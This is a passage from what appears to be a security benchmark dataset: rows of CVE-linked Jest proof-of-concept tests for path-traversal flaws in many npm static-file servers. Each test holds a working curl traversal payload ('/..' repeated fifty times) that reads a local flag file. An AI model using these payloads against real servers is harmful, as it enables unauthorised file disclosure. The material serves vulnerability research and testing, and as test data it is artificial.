  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:gaoxiaotingtingting:20170510; https://github.com/advisories/GHSA-qhf6-vqq9-q2p7
path-traversal,,@vivaxy/here,3.1.0,3.2.2,path-traversal/@vivaxy-here_3.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 3000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in @vivaxy/here"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  try {
    a.execSync(""fuser -k 3000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/@vivaxy/here/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:3000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/vivaxy/here/commit/298dbab41344dfb7f95f66b1fa7b5cfb436bd4a2,lib/read-file.js:11:19,https://security.snyk.io/vuln/SNYK-JS-VIVAXYHERE-455285; 
path-traversal,CVE-2017-16101,serverwg,1.0.0,,path-traversal/serverwg_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverwg"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverwg/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:serverwg:20170511; https://github.com/advisories/GHSA-2f29-pmpx-vj62
path-traversal,,servewuqianqianqian,1.0.0,,path-traversal/servewuqianqianqian_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in servewuqianqianqian"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/servewuqianqianqian/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:servewuqianqianqian:20180306; 
path-traversal,CVE-2018-3714,node-srv,2.0.0,2.1.1,path-traversal/node-srv_2.0.0,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in node-srv"", (done) => {
  expect.assertions(1);
  let Server = require(""node-srv"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let srv = new Server(
    {
      port: 8080,
      root: ""./"",
      logs: true,
    },
    function () {}
  );
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    srv.stop();
    done();
  });
});
",https://github.com/nim579/node-srv/commit/15be996c0520ac6e4dee0cf0808fc7e72effd2a2,lib/server.js:185:19,https://security.snyk.io/vuln/npm:node-srv:20180125; https://github.com/advisories/GHSA-52r9-g5g6-2hjp
path-traversal,,serverxh,1.0.0,,path-traversal/serverxh_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverxh"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverxh/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:serverxh:20180226; 
path-traversal,,servershuai,1.2.0,,path-traversal/servershuai_1.2.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in servershuai"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/servershuai/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:8:8,https://security.snyk.io/vuln/npm:servershuai:20180226; 
path-traversal,,angular-http-server,1.0.0,1.4.4,path-traversal/angular-http-server_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in angular-http-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/angular-http-server/angular-http-server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/simonh1000/angular-http-server/commit/8bafc9577161469f5dea01e0b98ea9c525d063e9,angular-http-server.js:16:29,https://security.snyk.io/vuln/npm:angular-http-server:20180426; https://github.com/advisories/GHSA-4rvg-955w-h68q
path-traversal,,caolilinode1,1.0.0,,path-traversal/caolilinode1_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in caolilinode1"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = "" node ./node_modules/caolilinode1/caolili.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,caolili.js:10:8,https://security.snyk.io/vuln/npm:caolilinode1:20180226; 
path-traversal,CVE-2018-16485,m-server,1.4.0,1.4.2,path-traversal/m-server_1.4.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 7000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in m-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 7000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/m-server/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:7000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/nunnly/m-server/commit/01f13f040d1961ca3146dce7e2db990156e65e9a,lib/index.js:14:28,https://security.snyk.io/vuln/npm:m-server:20180226; https://github.com/advisories/GHSA-899g-6q6w-7v94
path-traversal,,fakelearnnodejs,0.0.1,,path-traversal/fakelearnnodejs_0.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 3000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in fakelearnnodejs"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 3000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/fakelearnnodejs/app.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:3000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,app.js:8:8,https://security.snyk.io/vuln/npm:fakelearnnodejs:20180226; 
path-traversal,CVE-2017-16159,caolilinode,1.0.0,,path-traversal/caolilinode_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in caolilinode"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/caolilinode/caolili.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,caolili.js:7:8,https://security.snyk.io/vuln/npm:caolilinode:20170617; https://github.com/advisories/GHSA-2958-5r4r-wvv6
path-traversal,,wuzhuangserver,1.8.0,,path-traversal/wuzhuangserver_1.8.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wuzhuangserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wuzhuangserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:12:8,https://security.snyk.io/vuln/npm:wuzhuangserver:20180306; 
path-traversal,CVE-2017-16153,gaoxuyan,1.1.0,,path-traversal/gaoxuyan_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in gaoxuyan"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/gaoxuyan/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:8:8,https://security.snyk.io/vuln/npm:gaoxuyan:20170505; https://github.com/advisories/GHSA-j9wj-26p5-fj2v
path-traversal,CVE-2020-7684,rollup-plugin-serve,0.4.2,,path-traversal/rollup-plugin-serve_0.4.2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in rollup-plugin-serve"", (done) => {
  expect.assertions(1);
  const server = require(""rollup-plugin-serve"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  server({
    host: ""localhost"",
    port: 9000,
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,dist/index.cjs.js:111:6,https://security.snyk.io/vuln/SNYK-JS-ROLLUPPLUGINSERVE-585897; https://github.com/advisories/GHSA-4j46-mp85-mv8c
path-traversal,CVE-2017-16156,myprolyz,1.1.0,,path-traversal/myprolyz_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8889/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in myprolyz"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8889/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/myprolyz/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8889${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:9:8,https://security.snyk.io/vuln/npm:myprolyz:20170505; https://github.com/advisories/GHSA-pr8j-3v7m-j4vv
path-traversal,CVE-2017-16135,serverzyy,1.0.0,,path-traversal/serverzyy_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverzyy"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverzyy/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",,index.js:8:8,https://security.snyk.io/vuln/npm:serverzyy:20170430; https://github.com/advisories/GHSA-pxq7-4ppw-qp7f
path-traversal,CVE-2017-16133,goserv,1.0.0,,path-traversal/goserv_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in goserv"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/goserv/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,lib/goserv.js:63:9,https://security.snyk.io/vuln/npm:goserv:20170612; https://github.com/advisories/GHSA-pwqj-h62h-q35c
path-traversal,,severzlt,1.0.0,,path-traversal/severzlt_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in severzlt"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/severzlt/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:9:8,https://security.snyk.io/vuln/npm:severzlt:20171006; 
path-traversal,,basic-static,2.0.2,,path-traversal/basic-static_2.0.2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in basic-static"", (done) => {
  expect.assertions(1);
  const basicStatic = require(""basic-static"");
  const serveStatic = basicStatic({
    rootDir: process.cwd(),
    compress: true,
  });
  const http = require(""http"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8999/tcp"", () => {});
  } catch (e) {}
  const server = http.createServer(function (req, res) {
    serveStatic(req, res);
  });
  server.listen(8999);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8999${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,basic-static.js:121:21,https://security.snyk.io/vuln/npm:basic-static:20180226; 
path-traversal,,node-static-webserver,0.0.1,,path-traversal/node-static-webserver_0.0.1,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in node-static-webserver"", (done) => {
  expect.assertions(1);
  const pkg = require(""node-static-webserver"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8984/tcp"", () => {});
  } catch (e) {}
  new pkg(__dirname, 8984, ""127.0.0.1"");
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8984${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,node-static-webserver.js:79:25,https://security.snyk.io/vuln/npm:node-static-webserver:20180226; 
path-traversal,CVE-2019-5444,serve-here.js,1.1.0,1.2.0,path-traversal/serve-here.js_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serve-here.js"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serve-here.js/bin/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/ChristoPy/serve-here.js/commit/cefb51d03290b6a88dd13143ab2de31b8cf57c39,source/server.js:27:15,https://security.snyk.io/vuln/SNYK-JS-SERVEHEREJS-450884; https://github.com/advisories/GHSA-4448-rc82-fcr7
path-traversal,CVE-2019-5447,http-file-server,0.2.6,,path-traversal/http-file-server_0.2.6,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in http-file-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/http-file-server/http-file-server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,http-file-server.js:200:22,https://security.snyk.io/vuln/SNYK-JS-HTTPFILESERVER-451564; https://github.com/advisories/GHSA-2mp5-m968-gwr2
path-traversal,,ussasasa,1.0.0,,path-traversal/ussasasa_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in ussasasa"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/ussasasa/index.js"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:8:8,https://security.snyk.io/vuln/npm:ussasasa:20180226; 
path-traversal,CVE-2017-16180,serverabc,1.0.0,,path-traversal/serverabc_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverabc"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverabc/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:9:8,https://security.snyk.io/vuln/npm:serverabc:20170518; https://github.com/advisories/GHSA-pr49-5hhf-6mm6
path-traversal,CVE-2017-16122,cuciuci,1.1.0,,path-traversal/cuciuci_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in cuciuci"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/cuciuci/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:7:8,https://security.snyk.io/vuln/npm:cuciuci:20170511; https://github.com/advisories/GHSA-w3cg-6577-wx9f
path-traversal,CVE-2017-16190,dcdcdcdcdc,1.0.0,,path-traversal/dcdcdcdcdc_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in dcdcdcdcdc"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/dcdcdcdcdc/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,node.js:9:8,https://security.snyk.io/vuln/npm:dcdcdcdcdc:20170617; https://github.com/advisories/GHSA-8vmc-g99q-xj94
path-traversal,CVE-2017-16199,susu-sum,1.0.0,,path-traversal/susu-sum_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
